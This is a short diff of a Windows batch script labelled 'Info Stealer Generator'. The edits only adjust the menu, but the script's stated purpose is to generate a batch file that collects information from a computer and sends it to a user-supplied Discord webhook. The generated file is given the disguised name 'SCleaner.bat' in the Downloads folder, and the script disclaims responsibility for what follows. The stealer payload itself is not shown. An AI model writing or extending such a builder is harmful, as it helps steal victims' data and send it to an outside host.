@@ -9,13 +9,11 @@ call logo.bat
 echo.
 echo Info Stealer Generator
 echo =======================
-echo B. Back
-echo.
 echo I AM NOT RESPONSIBLE FOR ANYTHING CAUSED BY THIS SCRIPT.
 echo This will generate a batch script that will collect info from a computer and send it to a discord webhook.
+echo.
 set /p webhook=Please enter a webhook URL: 
 if exist "%USERPROFILE%\Downloads\SCleaner.bat" del "%USERPROFILE%\Downloads\SCleaner.bat"
-if /i "%webhook%"=="B" goto main
 type isgen.txt>>"%USERPROFILE%\Downloads\SCleaner.bat"
 echo.>>"%USERPROFILE%\Downloads\SCleaner.bat"
 echo set webhook=%webhook%>>"%USERPROFILE%\Downloads\SCleaner.bat"
